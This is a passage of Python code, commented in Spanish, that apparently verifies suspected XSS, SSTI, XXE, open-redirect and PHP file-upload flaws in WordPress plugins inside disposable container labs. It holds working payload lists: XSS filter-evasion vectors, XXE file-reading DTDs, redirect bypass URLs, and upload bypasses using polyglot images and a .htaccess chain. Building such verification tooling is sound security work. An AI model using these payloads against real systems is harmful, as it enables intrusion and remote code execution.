            f"<iframe src=\"javascript:{js}\"></iframe>",
            f"<details open ontoggle=\"{js}\">x</details>",
            f"<video><source onerror=\"{js}\"></video>",
            f"<marquee onstart=\"{js}\">x</marquee>",
            # rotura de atributo HTML (el payload cae DENTRO de value="..."/placeholder="..." etc.)
            f"\"><script>{js}</script>",
            f"'><script>{js}</script>",
            f"\" onmouseover=\"{js}\" x=\"",
            f"' onmouseover='{js}' x='",
            f"\" autofocus onfocus=\"{js}\" x=\"",
            # rotura de contexto JS-string (el payload cae dentro de un <script>var x='...'</script>
            # ya existente, no en HTML plano -- no vale cerrar con <script>, hay que cerrar la
            # cadena/el propio tag <script> primero)
            f"';{js};//", f'";{js};//',
            f"</script><script>{js}</script>",
            # contexto de URI (href/src esperando una URL, no HTML)
            f"javascript:{js}",
            # variantes de evasion de filtro (mayusculas mezcladas, sin parentesis en el nombre de
            # tag, entidades HTML, doble codificacion simple) -- para cuando el filtro busca
            # literalmente "<script" o "javascript:" en minusculas
            f"<ScRiPt>{js}</sCrIpT>",
            f"<img src=x onerror=&#34;{js}&#34;>",
            f"<svg/onload=\"{js}\">",
            f"<a href=\"jav&#x09;ascript:{js}\">x</a>",
        ]
        # ademas de los anteriores (rotura de contexto elegida a mano), TODAS las variantes
        # generalizables de xss_alert_identifiable.txt en PayloadsAllTheThings (cientos de
        # vectores de evasion de filtro reales -- \xNN entre tag/atributo, handlers poco
        # comunes, trucos de entidades) con su alert(NNNN) fijo sustituido por este mismo `js`.
        from .payload_kb import load_xss_payloads
        attempts += load_xss_payloads(js)

        m = (http_method or "GET").upper()
        found = False
        tried = []
        # UN SOLO navegador para los ~500+ intentos (ver _XssBrowserSession): arrancar un
        # Chromium por payload, confirmado en vivo, tarda minutos -- el coste real es el arranque
        # del propio navegador. Tambien se captura pantalla SOLO del intento ganador (un segundo
        # render con capture=True), no de cada intento fallido.
        step(f"arrancando Chromium headless (se reutiliza para los {len(attempts)} intentos)...")
        with _XssBrowserSession() as xb:
            for payload_value in attempts:
                params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
                params[xss_param] = payload_value
                title, _ = xb.render(boot.base_url, endpoint, m, params, cookies)
                tried.append({"payload": payload_value, "title_resultante": title})
                if title == marker:
                    found = True
                    res.evidence["payload_ganador"] = payload_value
                    step(f"VERIFICADO: el navegador EJECUTO el script inyectado -- document.title "
                         f"cambio exactamente a '{marker}'.")
                    _, png = xb.render(boot.base_url, endpoint, m, params, cookies, capture=True)
                    if png:
                        boot.shots.append({
                            "caption_es": (f"Paso 5: XSS confirmado -- el navegador REAL ejecuto el "
                                          f"script inyectado en '{xss_param}', cambiando document.title "
                                          f"al marcador '{marker}' (no es texto reflejado, es codigo JS "
                                          f"ejecutandose)."),
                            "caption_en": (f"Step 5: XSS confirmed -- the REAL browser executed the "
                                          f"script injected in '{xss_param}', changing document.title "
                                          f"to the marker '{marker}' (not reflected text, actual JS "
                                          f"running)."),
                            "png_b64": png, "url": boot.base_url + endpoint})
                    break
        res.evidence.update({"login_bajo_privilegio": boot.sub_user,
                             "login_bajo_privilegio_password": boot.sub_pass,
                             "xss_param": xss_param, "token": token, "metodo": m,
                             "endpoint": endpoint, "intentos": tried})
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"XSS confirmado: el navegador real EJECUTO el script inyectado en "
                          f"{xss_param} -- document.title cambio exactamente a '{marker}', algo "
                          f"que solo el motor JS del navegador pudo hacer, no una coincidencia de "
                          f"texto reflejado")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de XSS para {xss_param} y en "
                          f"ninguna el navegador ejecuto el script (document.title nunca cambio a "
                          f"'{marker}') -- el XSS no se confirmo (puede que el contexto de "
                          f"reflexion sea distinto, que haya sanitizacion real, o que el efecto "
                          f"solo se vea en OTRA pagina que esta version no visita)")
        res.evidence["screenshots"] = boot.shots
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red/volumen)...")
        lab.teardown()


def verify_wordpress_ssti(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, ssti_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Verifica server-side template injection con la misma idea que command injection: el payload
    pide al motor de plantillas que CALCULE un producto de dos numeros aleatorios (sintaxis de
    varios motores -- Jinja2/Twig {{ }}, ERB <%= %>, Velocity/Smarty ${ }, Ruby #{ }); si el
    producto (que no aparece en ningun punto del payload enviado) sale en la respuesta, es prueba
    de que el motor de plantillas EVALUO codigo, no que lo reflejo como texto."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    ssti_param = ssti_param_hint or _pick_param(parameters, _XSS_HINTS)
    if not ssti_param:
        res.detail = "no se identifico el parametro que llega al motor de plantillas"
        res.limitations.append("la verificacion de SSTI necesita saber que parametro llega a la "
                               "plantilla; afina 'parameters' en la hipotesis del LLM o pasalo a "
                               "mano (ssti_param_hint)")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        a, b = secrets.randbelow(90) + 10, secrets.randbelow(90) + 10
        expected = a * b
        mul = f"{a}*{b}"
        attempts = [
            # sintaxis directa de cada motor (Jinja2/Twig, Smarty/Velocity-like, Ruby/Slim, ERB,
            # Pebble, Freemarker/single-brace)
            f"{{{{{mul}}}}}", f"${{{mul}}}", f"#{{{mul}}}", f"<%= {mul} %>",
            f"{{{mul}}}", f"${{{{{mul}}}}}", f"<#if true>${{{mul}}}</#if>",
            # rotura de contexto cuando el valor cae DENTRO de otra expresion de plantilla ya
            # existente (p.ej. {{ "hola " + valor }}) -- hay que cerrar esa expresion primero
            f"}}{{{mul}}}{{", f"'}}{{{mul}}}{{'", f'"}}{{{mul}}}{{"',
            f"-}}{{{mul}}}{{-",          # control de espacios en blanco de Jinja2 ({%- -%})
            # rotura de atributo HTML antes de la plantilla (si el valor se inserta en
            # value="..."  dentro de una plantilla que luego evalua su propio contenido)
            f"\">{{{{{mul}}}}}<\"",
        ]
        # ademas de las anteriores (sintaxis elegida a mano), TODAS las plantillas aritmeticas
        # generalizables de ssti.fuzz en PayloadsAllTheThings -- cada una trae su propio resultado
        # esperado (la mayoria son a*b, pero @() de ASP classic usa a+b, sintaxis distinta).
        from .payload_kb import load_ssti_arithmetic_payloads
        attempt_pairs = [(p, expected) for p in attempts] + load_ssti_arithmetic_payloads(a, b)
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "ssti_param": ssti_param, "a": a, "b": b, "producto_esperado": expected,
            "metodo": (http_method or "GET").upper(), "endpoint": endpoint,
        })

        m = (http_method or "GET").upper()
        found = False
        tried = []
        for payload_value, payload_expected in attempt_pairs:
            pattern = re.compile(rf"(?<!\d){payload_expected}(?!\d)")
            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
            payload[ssti_param] = payload_value
            step(f"probando {m} {endpoint} con {ssti_param}={payload_value!r}...")
            try:
                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                                   data=payload if m != "GET" else None,
                                   params=payload if m == "GET" else None, timeout=20)
            except Exception as e:
                tried.append({"payload": payload_value, "error": str(e)})
                continue
            matched = bool(pattern.search(resp.text or ""))
            tried.append({"payload": payload_value, "status": resp.status_code,
                         "producto_presente": matched})
            if matched:
                found = True
                res.evidence["payload_ganador"] = payload_value
                res.evidence["resultado_esperado_ganador"] = payload_expected
                res.evidence["status_code_respuesta"] = resp.status_code
                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                step(f"VERIFICADO: la respuesta contiene {payload_expected}, calculado por el "
                     f"motor de plantillas -- ese numero no aparece en el payload enviado.")
                step("capturando pantalla: la respuesta HTTP con el producto calculado por el "
                     "motor de plantillas (prueba final)...")
                shot_url = (boot.base_url + endpoint
                           + ("&" if "?" in endpoint else "?")
                           + f"{ssti_param}={payload_value}") if m == "GET" else None
                if shot_url:
                    boot.capture(boot.sub_sess, shot_url[len(boot.base_url):],
                           f"Paso 5: SSTI confirmada -- la respuesta contiene {payload_expected}, "
                           f"que solo pudo calcularse evaluando codigo en el motor de plantillas, "
                           f"no reflejando el payload enviado.",
                           f"Step 5: SSTI confirmed -- the response contains {payload_expected}, "
                           f"which could only come from the template engine evaluating code, not "
                           f"from reflecting the sent payload.")
                break
        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"SSTI confirmada: la peticion con {ssti_param}="
                          f"{res.evidence['payload_ganador']!r} hizo que el motor de plantillas "
                          f"EVALUARA la expresion y devolviera {res.evidence['resultado_esperado_ganador']} "
                          f"en la respuesta -- prueba inequivoca de evaluacion de codigo en "
                          f"servidor (ese numero no esta en ningun punto del payload enviado)")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} sintaxis de plantilla para {ssti_param} "
                          f"(producto esperado {a}*{b}={expected}, mas las plantillas aditivas) y "
                          f"ninguna produjo el resultado esperado en la respuesta -- el SSTI no "
                          f"se confirmo (puede necesitar otra sintaxis de motor, o el "
                          f"endpoint/parametro no son los reales)")
        res.evidence["screenshots"] = boot.shots
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red/volumen)...")
        lab.teardown()


def verify_wordpress_xxe(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, xml_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Verifica XML External Entity con el mismo patron de fichero canario que path-traversal/LFI
    (ver verify_wordpress_path_traversal): planta un secreto aleatorio en una ruta del sistema de
    ficheros REAL del contenedor, construye una DTD externa que apunta a esa ruta con file://, y
    confirma que el secreto EXACTO aparece en la respuesta tras mandar el XML -- no una deduccion
    por status code o tiempo de respuesta. Prueba tanto mandar la DTD como VALOR de un parametro
    de formulario (si la hipotesis cita uno) como mandarla como CUERPO crudo de la peticion
    (application/xml y text/xml), que es el caso mas comun en APIs REST."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    xml_param = xml_param_hint or _pick_param(parameters, _XML_HINTS)

    lab = _Lab(_token())
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        secret = secrets.token_hex(16)
        canary_path = f"/tmp/binoracle_canary_{_token()}.txt"
        step(f"plantando fichero canario con un secreto aleatorio en {canary_path}...")
        if not boot.lab.write_canary(canary_path, secret):
            res.detail = f"no se pudo plantar el fichero canario en {canary_path}"
            return res

        xxe_xml = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                  f'"file://{canary_path}">]><foo>&xxe;</foo>')
        m = (http_method or "GET").upper()
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "xml_param": xml_param or "(cuerpo crudo)", "canary_path": canary_path,
            "canary_secret": secret, "metodo": m, "endpoint": endpoint,
        })

        tried = []
        found = False

        def try_send(label, **kwargs):
            nonlocal found
            step(f"probando {m} {endpoint} ({label})...")
            try:
                resp = boot.sub_sess.request(m, boot.base_url + endpoint, timeout=20, **kwargs)
            except Exception as e:
                tried.append({"modo": label, "error": str(e)})
                return
            present = secret in (resp.text or "")
            followed_resp, follow_url = resp, None
            if not present:
                for candidate in _extract_followable_urls(resp.text, boot.base_url):
                    try:
                        candidate_resp = boot.sub_sess.request("GET", candidate, timeout=20)
                    except Exception:
                        continue
                    if secret in (candidate_resp.text or ""):
                        followed_resp, follow_url, present = candidate_resp, candidate, True
                        break
            tried.append({"modo": label, "status": resp.status_code, "secreto_presente": present,
                         **({"followed_url": follow_url} if follow_url else {})})
            if present and not found:
                found = True
                res.evidence["modo_ganador"] = label
                if follow_url:
                    res.evidence["url_seguida"] = follow_url
                res.evidence["status_code_respuesta"] = followed_resp.status_code
                res.evidence["respuesta_cuerpo_recorte"] = (followed_resp.text or "")[:500]
                step((f"VERIFICADO: el secreto plantado aparecio literal en la respuesta de "
                     f"{follow_url} ({label}, la peticion copio el fichero ahi en vez de "
                     f"devolver el contenido directo)" if follow_url else
                     f"VERIFICADO: el secreto plantado aparecio literal en la respuesta "
                     f"({label})."))

        # variantes del XML en si: la entidad DOCTYPE normal, parametro-entidad (algunos parsers
        # solo resuelven SYSTEM dentro de %param;, no en una entidad general directa), y envuelta
        # en SOAP (algunas APIs esperan un envelope, no XML plano)
        xxe_param_entity = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
                            f'"file://{canary_path}"> %xxe; ]><foo>test</foo>')
        xxe_soap = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                   f'"file://{canary_path}">]><soap:Envelope '
                   f'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>'
                   f'<foo>&xxe;</foo></soap:Body></soap:Envelope>')
        xml_variants = [("entidad general (DOCTYPE normal)", xxe_xml),
                        ("parametro-entidad", xxe_param_entity),
                        ("envuelta en SOAP", xxe_soap)]

        for label, xml_body in xml_variants:
            if found:
                break
            if xml_param:
                payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
                payload[xml_param] = xml_body
                try_send(f"{label}, parametro de formulario",
                         data=payload if m != "GET" else None,
                         params=payload if m == "GET" else None)
            if not found:
                try_send(f"{label}, cuerpo crudo application/xml", data=xml_body.encode(),
                         headers={"Content-Type": "application/xml"})
            if not found:
                try_send(f"{label}, cuerpo crudo text/xml", data=xml_body.encode(),
                         headers={"Content-Type": "text/xml"})

        res.evidence["intentos"] = tried

        # fallback OOB/blind: si ninguna variante en banda devolvio el secreto en la respuesta
        # (p.ej. porque el resultado de la entidad nunca se refleja de vuelta), se referencia el
        # listener interno de SSRF (ver verify_wordpress_ssrf) como SYSTEM de la entidad -- si el
        # parser XML resuelve entidades externas DE VERDAD, intentara conectarse por HTTP a esa
        # URL, y la conexion queda grabada con un token unico. No extrae el secreto del fichero
        # (es una prueba mas debil que la del canario en banda), pero confirma que el parser
        # resuelve entidades externas arbitrarias -- suficiente para XXE ciego/OOB.
        oob_hit = None
        if not found:
            step("ninguna variante en banda devolvio el secreto; probando XXE ciego/OOB via el "
                 "listener interno...")
            listener = lab.start_listener()
            if listener:
                oob_token = _token()
                oob_xml = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                          f'"http://{lab.listener}:8080/binoracle-xxe-oob-{oob_token}">]>'
                          f'<foo>&xxe;</foo>')
                payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
                if xml_param:
                    payload[xml_param] = oob_xml
                    try:
                        boot.sub_sess.request(m, boot.base_url + endpoint,
                                   data=payload if m != "GET" else None,
                                   params=payload if m == "GET" else None, timeout=20)
                    except Exception:
                        pass
                else:
                    try:
                        boot.sub_sess.request(m, boot.base_url + endpoint, data=oob_xml.encode(),
                                   headers={"Content-Type": "application/xml"}, timeout=20)
                    except Exception:
                        pass
                time.sleep(2)
                oob_log = lab.listener_log()
                oob_hit = oob_token in oob_log
                res.evidence["oob_intento"] = {"token": oob_token, "hit": oob_hit}
                if oob_hit:
                    found = True
                    res.evidence["tecnica"] = "oob-blind"
                    res.evidence["modo_ganador"] = "OOB via listener interno"

        if found:
            res.verified = True
            res.ok = True
            if res.evidence.get("tecnica") == "oob-blind":
                res.detail = ("XXE ciego/OOB confirmado: el parser XML intento resolver una "
                              "entidad externa apuntando a un listener interno (inalcanzable "
                              "desde fuera del laboratorio), y la conexion llego con el token "
                              "exacto -- prueba de que el parser resuelve entidades externas "
                              "arbitrarias, aunque no se extrajo el contenido del fichero (mas "
                              "debil que la prueba en banda con el canario)")
            else:
                res.detail = (f"XXE confirmada ({res.evidence['modo_ganador']}): la respuesta "
                              f"contiene el secreto exacto plantado en {canary_path} -- el "
                              f"parser XML resolvio una entidad externa apuntando al sistema de "
                              f"ficheros real")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} formas de mandar la entidad externa (en "
                          f"banda) y el intento OOB via listener interno, y ninguna confirmo "
                          f"nada -- el XXE no se confirmo (puede que el parser tenga "
                          f"resolve_external_entities desactivado, o el endpoint/parametro no "
                          f"son los reales)")
        res.evidence["screenshots"] = boot.shots
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red/volumen)...")
        lab.teardown()


def verify_wordpress_open_redirect(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, redirect_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Verifica open redirect mandando como valor del parametro una URL EXTERNA completa, con
    redirects deshabilitados en el cliente (allow_redirects=False) para inspeccionar la cabecera
    Location real sin seguirla. Se marca verificado SOLO si la respuesta es un 3xx y la cabecera
    Location coincide EXACTA (o empieza exactamente) con la URL externa que mandamos -- no una
    deduccion por el codigo de estado solo, que tambien aparece en redirecciones legitimas."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    redirect_param = redirect_param_hint or _pick_param(parameters, _REDIRECT_HINTS)
    if not redirect_param:
        res.detail = "no se identifico el parametro que lleva la URL de destino"
        res.limitations.append("la verificacion de open redirect necesita saber que parametro "
                               "lleva la URL de destino; afina 'parameters' en la hipotesis del "
                               "LLM o pasalo a mano (redirect_param_hint)")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        token = _token()
        evil_host = f"binoracle-lab-redirect-{token}.invalid"
        # variantes de bypass: cada una ataca un tipo de filtro distinto -- una comprobacion con
        # startswith('http') se salta con protocol-relative, una que solo mira el host tras el
        # esquema se confunde con el truco de userinfo (@), un parser laxo acepta backslash donde
        # el navegador tambien lo acepta, y un filtro de substring ingenuo cae con espacios/tabs.
        targets = [
            f"https://{evil_host}/pwned",                              # URL externa directa
            f"//{evil_host}/pwned",                                    # protocol-relative
            f"https:/\\{evil_host}/pwned",                             # backslash parcial
            f"https:\\\\{evil_host}\\pwned",                           # backslash total
            f"https://trusted.example.com@{evil_host}/pwned",          # userinfo (host confiable antes de @)
            f"https://{evil_host}\\@trusted.example.com/pwned",        # userinfo invertido con backslash
            f" https://{evil_host}/pwned",                             # espacio inicial
            f"\thttps://{evil_host}/pwned",                            # tab inicial
            f"https://{evil_host}#@trusted.example.com/",              # truco de fragmento
            f"https://trusted.example.com.{evil_host}/pwned",          # subdominio del host confiable
            f"///{evil_host}/pwned",                                   # triple slash (algunos parsers lo siguen tratando como protocol-relative)
            f"////{evil_host}/pwned",                                  # cuadruple slash
            f"/https://{evil_host}/pwned",                             # slash inicial delante de URL absoluta (burla un check 'startswith(/)')
        ]
        from .payload_kb import load_open_redirect_templates
        targets += load_open_redirect_templates(evil_host)
        m = (http_method or "GET").upper()
        tried = []
        confirmed_entry = None
        for target in targets:
            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
            payload[redirect_param] = target
            step(f"probando {m} {endpoint} con {redirect_param}={target!r} (sin seguir redirects)...")
            try:
                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                                   data=payload if m != "GET" else None,
                                   params=payload if m == "GET" else None, timeout=20,
                                   allow_redirects=False)
            except Exception as e:
                tried.append({"target": target, "error": str(e)})
                continue
            location = resp.headers.get("Location", "")
            is_redirect = resp.status_code in (301, 302, 303, 307, 308)
            confirmed = is_redirect and _redirect_location_is_external(location, evil_host)
            tried.append({"target": target, "status": resp.status_code, "location": location,
                         "confirmado": confirmed})
            if confirmed:
                confirmed_entry = tried[-1]
                break
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "redirect_param": redirect_param, "dominio_externo_esperado": evil_host,
            "metodo": m, "endpoint": endpoint, "intentos": tried,
        })

        if confirmed_entry:
            res.verified = True
            res.ok = True
            res.evidence["status_code_respuesta"] = confirmed_entry["status"]
            res.evidence["location_recibida"] = confirmed_entry["location"]
            res.evidence["url_externa_ganadora"] = confirmed_entry["target"]
            res.detail = (f"OPEN REDIRECT confirmado: la peticion con {redirect_param}="
                          f"{confirmed_entry['target']!r} produjo un {confirmed_entry['status']} "
                          f"con Location={confirmed_entry['location']!r} -- el servidor redirige "
                          f"de verdad a un dominio externo controlado por el atacante")
            step(f"VERIFICADO: Location={confirmed_entry['location']!r} contiene el dominio "
                 f"externo enviado.")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de bypass (directa, "
                          f"protocol-relative, backslash, userinfo, espacios/tabs, subdominio) "
                          f"para {redirect_param} y ninguna produjo un redirect con "
                          f"'{evil_host}' en Location -- el open redirect no se confirmo")
        res.evidence["screenshots"] = boot.shots
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red/volumen)...")
        lab.teardown()


def verify_wordpress_file_upload(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, file_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Verifica unrestricted file upload (webshell) en dos pasos, ambos con prueba dura:

    1) sube un fichero PHP disfrazado (varias combinaciones de extension: .php, .php.jpg,
       .phtml, .php5, .pHp, .jpg.php) cuyo CONTENIDO calcula `a+b` para dos numeros aleatorios.
    2) en vez de adivinar la URL publica (WordPress puede renombrar/sanear el nombre), se
       pregunta DIRECTAMENTE al filesystem del contenedor (find_in_webroot) por un fichero cuyo
       nombre contenga el token unico de ese intento, se construye su URL publica real a partir de
       esa ruta, y se pide. Si la respuesta contiene la SUMA calculada (y no el codigo PHP fuente
       sin ejecutar), es prueba de que el fichero subido se EJECUTA como PHP, no solo que se
       guardo -- un servidor que solo almacena el fichero devolveria el codigo fuente literal, que
       no contiene ese numero en ningun punto."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    file_param = file_param_hint or _pick_param(parameters, _FILE_UPLOAD_HINTS)
    if not file_param:
        res.detail = "no se identifico el parametro (campo de formulario) del fichero subido"
        res.limitations.append("la verificacion de file-upload necesita saber que campo lleva el "
                               "fichero; afina 'parameters' en la hipotesis del LLM o pasalo a "
                               "mano (file_param_hint)")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        m = (http_method or "POST").upper()
        # cada variante ataca un tipo distinto de validacion: extension simple/doble, mayusculas
        # mezcladas (filtros case-sensitive), truco del punto-y-coma de IIS/Apache antiguos, y
        # magic bytes REALES de imagen delante del PHP (bypass de getimagesize()/exif_imagetype(),
        # que solo miran los primeros bytes, no el resto del fichero).
        variants = [
            ("binoracle_{t}.php", b"", "image/jpeg"),
            ("binoracle_{t}.php.jpg", b"", "image/jpeg"),
            ("binoracle_{t}.phtml", b"", "image/jpeg"),
            ("binoracle_{t}.php5", b"", "image/jpeg"),
            ("binoracle_{t}.php7", b"", "image/jpeg"),
            ("binoracle_{t}.php3", b"", "image/jpeg"),
            ("binoracle_{t}.pht", b"", "image/jpeg"),
            ("binoracle_{t}.phar", b"", "application/octet-stream"),
            ("binoracle_{t}.pHp", b"", "image/jpeg"),
            ("binoracle_{t}.jpg.php", b"", "image/jpeg"),
            ("binoracle_{t}.php;.jpg", b"", "image/jpeg"),
            ("binoracle_{t}.jpg", b"GIF89a;", "image/gif"),              # polyglot GIF89a + PHP
            ("binoracle_{t}.jpg", b"\xff\xd8\xff\xe0", "image/jpeg"),    # polyglot JPEG SOI + PHP
            ("binoracle_{t}.png", b"\x89PNG\r\n\x1a\n", "image/png"),    # polyglot PNG + PHP
        ]
        other_params = {k: v for k, v in (dict(parameters) if isinstance(parameters, dict)
                                          else {p: "" for p in (parameters or [])}).items()
                        if k != file_param}
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "file_param": file_param, "metodo": m, "endpoint": endpoint,
        })

        found = False
        tried = []
        for tmpl, magic, content_type in variants:
            token = _token()
            fname = tmpl.format(t=token)
            a, b = secrets.randbelow(8000) + 1000, secrets.randbelow(8000) + 1000
            expected = a + b
            php_payload = magic + f"<?php echo {a}+{b}; ?>".encode()
            step(f"subiendo '{fname}' con {file_param} (magic bytes={magic!r}, contenido PHP "
                 f"que calcula {a}+{b})...")
            try:
                resp = boot.sub_sess.request(
                    m, boot.base_url + endpoint, data=other_params,
                    files={file_param: (fname, php_payload, content_type)}, timeout=20)
            except Exception as e:
                tried.append({"filename": fname, "error_subida": str(e)})
                continue
            found_path = lab.find_in_webroot(token)
            entry = {"filename": fname, "status_subida": resp.status_code,
                    "encontrado_en_contenedor": found_path}
            if not found_path:
                tried.append(entry)
                continue
            rel = found_path.replace("/var/www/html", "", 1)
            candidate_url = boot.base_url + rel
            entry["url_publica"] = candidate_url
            step(f"'{fname}' se guardo en {found_path}; pidiendolo directo para ver si se EJECUTA...")
            try:
                import requests as _requests
                r2 = _requests.get(candidate_url, timeout=15)
            except Exception as e:
                entry["error_peticion_directa"] = str(e)
                tried.append(entry)
                continue
            pattern = re.compile(rf"(?<!\d){expected}(?!\d)")
            executed = bool(pattern.search(r2.text or ""))
            entry["status_peticion_directa"] = r2.status_code
            entry["suma_esperada"] = expected
            entry["suma_presente"] = executed
            tried.append(entry)
            if executed:
                found = True
                res.evidence["filename_ganador"] = fname
                res.evidence["url_publica_ganadora"] = candidate_url
                res.evidence["status_code_respuesta"] = r2.status_code
                res.evidence["respuesta_cuerpo_recorte"] = (r2.text or "")[:500]
                step(f"VERIFICADO: {candidate_url} devolvio {expected} (={a}+{b}) -- el fichero "
                     f"subido se EJECUTA como PHP, no se sirve como archivo estatico.")
                step("capturando pantalla: la respuesta del webshell subido ejecutandose de "
                     "verdad (prueba final)...")
                boot.capture(boot.sub_sess, rel,
                       f"Paso 5: FILE UPLOAD confirmado -- '{fname}' se subio y se EJECUTA como "
                       f"PHP (devuelve {expected}={a}+{b}, calculado por el interprete, no el "
                       f"codigo fuente sin ejecutar).",
                       f"Step 5: FILE UPLOAD confirmed -- '{fname}' was uploaded and RUNS as "
                       f"PHP (returns {expected}={a}+{b}, computed by the interpreter, not the "
                       f"raw unexecuted source).")
                break
        res.evidence["intentos"] = tried

        # ultimo recurso: la cadena clasica del .htaccess de Apache. Si ninguna extension/magic
        # byte colo, se intenta subir un .htaccess que reinterprete .jpg como PHP (AddType), y
        # LUEGO una imagen con el payload -- dos peticiones encadenadas en vez de una sola, pero
        # con la misma prueba dura (la suma calculada) al final.
        htaccess_evidence = None
        if not found:
            step("ninguna variante directa funciono; probando la cadena .htaccess (AddType) + "
                 "imagen con el payload...")
            htaccess_body = b"AddType application/x-httpd-php .jpg\n"
            try:
                r_ht = boot.sub_sess.request(
                    m, boot.base_url + endpoint, data=other_params,
                    files={file_param: (".htaccess", htaccess_body, "text/plain")}, timeout=20)
                htaccess_evidence = {"status_subida_htaccess": r_ht.status_code}
            except Exception as e:
                htaccess_evidence = {"error_subida_htaccess": str(e)}
            if htaccess_evidence.get("status_subida_htaccess") is not None:
                token = _token()
                fname = f"binoracle_{token}.jpg"
                a, b = secrets.randbelow(8000) + 1000, secrets.randbelow(8000) + 1000
                expected = a + b
                php_payload = f"<?php echo {a}+{b}; ?>".encode()
                step(f"subiendo '{fname}' tras el .htaccess (deberia ejecutarse como PHP si el "
                     f".htaccess se respeto)...")
                try:
                    resp = boot.sub_sess.request(
                        m, boot.base_url + endpoint, data=other_params,
                        files={file_param: (fname, php_payload, "image/jpeg")}, timeout=20)
                    found_path = lab.find_in_webroot(token)
                    if found_path:
                        rel = found_path.replace("/var/www/html", "", 1)
                        candidate_url = boot.base_url + rel
                        import requests as _requests
                        r2 = _requests.get(candidate_url, timeout=15)
                        pattern = re.compile(rf"(?<!\d){expected}(?!\d)")
                        executed = bool(pattern.search(r2.text or ""))
                        htaccess_evidence.update({"filename": fname, "url_publica": candidate_url,
                                                  "suma_esperada": expected, "suma_presente": executed})
                        if executed:
                            found = True
                            res.evidence["tecnica"] = "htaccess-chain"
                            res.evidence["filename_ganador"] = fname
                            res.evidence["url_publica_ganadora"] = candidate_url
                            res.evidence["status_code_respuesta"] = r2.status_code
                            res.evidence["respuesta_cuerpo_recorte"] = (r2.text or "")[:500]
                            step(f"VERIFICADO (cadena .htaccess): {candidate_url} devolvio "
                                 f"{expected} (={a}+{b}) -- el .htaccess subido reinterpreto "
                                 f".jpg como PHP de verdad.")
                except Exception as e:
                    htaccess_evidence["error_segunda_subida"] = str(e)
            res.evidence["htaccess_intento"] = htaccess_evidence

        if found:
            res.verified = True
            res.ok = True
